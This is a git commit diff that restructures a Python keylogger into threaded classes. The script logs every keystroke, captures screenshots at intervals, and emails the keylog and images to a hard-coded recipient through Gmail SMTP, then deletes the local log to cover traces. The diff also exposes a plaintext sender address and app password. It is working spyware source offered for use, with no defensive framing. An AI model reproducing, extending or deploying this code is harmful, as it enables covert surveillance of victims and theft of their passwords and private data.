93e8dd4f7f01ab95754af2f6e0151a32f8e09347
Thivanka <thivankanimesh@hotmail.com>
2019-07-07 06:54:59 +0530

    added multitreading

--- keylogger.py
+++ keylogger.py
@@ -1,9 +1,11 @@
 import os
+import threading
 import time
 import smtplib
 import ssl
-import pynput
+import multiprocessing
 import pyscreenshot as ImageGrab
+from pynput import keyboard
 from pynput.keyboard import Key,Listener
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
@@ -12,7 +14,7 @@ from email.mime.image import MIMEImage
 
 reciver_email_address="thivankanimesh@hotmail.com"
 mailling_time_gap=20
-screen_shots_time_gap=20
+screen_shots_time_gap=10
 mouse_click_events=False
 screen_shots=False
 web_records=False
@@ -22,86 +24,135 @@ delete_log_file=False
 sender_email_address="thivankanimshan@gmail.com"
 sender_email_password="jmpomhnpxzcvtfyr"
 last_mail_sent_time=time.time()
+last_screenshot_taken_time=time.time()
 port = 587
 
-keys = []
-overall_count =0
+class Screenshot(threading.Thread):
 
-#Make directories
-if not os.path.exists('./img'):
-        os.mkdir('img')
+        def __init__(self):
+                threading.Thread.__init__(self)
+      
+        def takeScreenshot(self):
+                global last_screenshot_taken_time
+                print("in ss")
+                #Make directories
+                if not os.path.exists('./img'):
+                        os.mkdir('img')
 
-#Connect to SMTP
-smtp=smtplib.SMTP('smtp.gmail.com',port)
-smtp.ehlo()
-smtp.starttls()
-smtp.ehlo()
+                if(time.time()-last_screenshot_taken_time>=screen_shots_time_gap):
+                        print("screenshot taken")
+                        lenth=len(os.listdir('./img'))
+                        im = ImageGrab.grab()
+                        im.save(str.format('./img/img{0}.png',lenth))
+                        last_screenshot_taken_time=time.time()
 
-smtp.login(sender_email_address,sender_email_password)
+        def run(self):
+                print("screenshot thread startted")
+
+class KeyLogger:
+
+        keys = []
+        overall_count=0
+
+        def write_file(self,key):
+                self.keys.append(key)
+                self.overall_count+=1
+                if(self.overall_count%10==0):
+                        file=open('log.txt','a')   
+                        for key in self.keys:
+                                file.write(str(key))
+                        file.write("\n")
+                        self.keys = []
+
+class Mail(threading.Thread):
+
+        global port
+
+        smtp=smtplib.SMTP('smtp.gmail.com',port)
+
+        def __init__(self):
+
+                threading.Thread.__init__(self)
+                #Connect to SMTP
+                self.smtp.ehlo()
+                self.smtp.starttls()
+                self.smtp.ehlo()
+
+                self.smtp.login(sender_email_address,sender_email_password)
+
+        def sendMail(self):
+
+                global last_mail_sent_time
+                file='log.txt'
+
+                msg=MIMEMultipart()
+                msg['Subject']='subject'
+                msg['From']=sender_email_address
+                msg['To']=reciver_email_address
+
+                #DEBUGGING
+                #print(time.time()-last_mail_sent_time)
+
+                if((time.time()-last_mail_sent_time)>=mailling_time_gap):
+
+                        #Making keylogs attachment
+                        keylogs_attachment=MIMEBase('application','octet-stream')
+                        keylogs_attachment.set_payload(open(file,'rb').read())
+                        keylogs_attachment.add_header('Content-Disposition','attachment; filename="%s"'%os.path.basename(file))
+                        msg.attach(MIMEText("Labour"))
+                        msg.attach(keylogs_attachment)
+                        #Errace file
+                        os.remove('log.txt')
+
+                        #Making screenshots attachment
+                        for image in os.listdir('./img'):
+                                screen_shots_attachment=MIMEImage(open(str.format('./img/{0}',image),'rb').read())
+                                msg.attach(screen_shots_attachment)
+
+                        self.smtp.sendmail(sender_email_address,reciver_email_address,msg.as_string())
+                        #Updating message sent time
+                        last_mail_sent_time=time.time()
+                        #DEBUGGIN
+                        print("email is sent")
+
+class System:
+
+        keylogger=KeyLogger()
+        screenshot=Screenshot()
+        mail=Mail()
+
+        if __name__ == '__main__':
+
+                print("if condition")
+
+                mail.start()
+                screenshot.start()
+                
+                mail.join()
+                screenshot.join()
+
+                print('if __name__ == ')
+        
+        def run(self,key):
+
+                print("test")
+                print(key)
+
+                self.screenshot.takeScreenshot()                
+                self.keylogger.write_file(key)
+                self.mail.sendMail()
+            
+sys=System()
 
 def on_press(key):
-    global keys    
-    global overall_count
-    #DEBUGGING
-    print(overall_count)   
-    keys.append(key)
-    overall_count+=1
-    write_file(key)
-    sendMail()
+        sys.run(key)
     
 def on_release(key):
-    if(key==Key.esc):
-        return False    
+        if(key==Key.esc):
+                return False  
 
-def write_file(key):
-        global keys
-        if(overall_count%10==0):
-            file=open('log.txt','a')   
-            for key in keys:
-                file.write(str(key))
-            file.write("\n")
-            keys = []
-
-
-def sendMail():
-
-        global last_mail_sent_time
-        file='log.txt'
-
-        msg=MIMEMultipart()
-        msg['Subject']='subject'
-        msg['From']=sender_email_address
-        msg['To']=reciver_email_address
-
-        #DEBUGGING
-        #print(time.time()-last_mail_sent_time)
-
-        if((time.time()-last_mail_sent_time)>=mailling_time_gap):
-
-                #Making keylogs attachment
-                keylogs_attachment=MIMEBase('application','octet-stream')
-                keylogs_attachment.set_payload(open(file,'rb').read())
-                keylogs_attachment.add_header('Content-Disposition','attachment; filename="%s"'%os.path.basename(file))
-                msg.attach(MIMEText("Labour"))
-                msg.attach(keylogs_attachment)
-                #Errace file
-                os.remove('log.txt')
-
-                #Making screenshots attachment
-                for image in os.listdir('./img'):
-                        screen_shots_attachment=MIMEImage(open(str.format('./img/{0}',image),'rb').read())
-                        msg.attach(screen_shots_attachment)
-
-                smtp.sendmail(sender_email_address,reciver_email_address,msg.as_string())
-                #Updating message sent time
-                last_mail_sent_time=time.time()
-                #DEBUGGIN
-                print("message sent")
-
-def takeScreenshot():
-        lenth=len(os.listdir('./img'))
-        im = ImageGrab.grab()
-        im.save(str.format('./img/img{0}.png',lenth))
-
-with Listener(on_press=on_press,on_release=on_release) as listener:
-    listener.join()
+listener= keyboard.Listener(on_press=on_press,on_release=on_release)
+if __name__ == '__main__':
+        listener.start()
+        listener.join()
+    
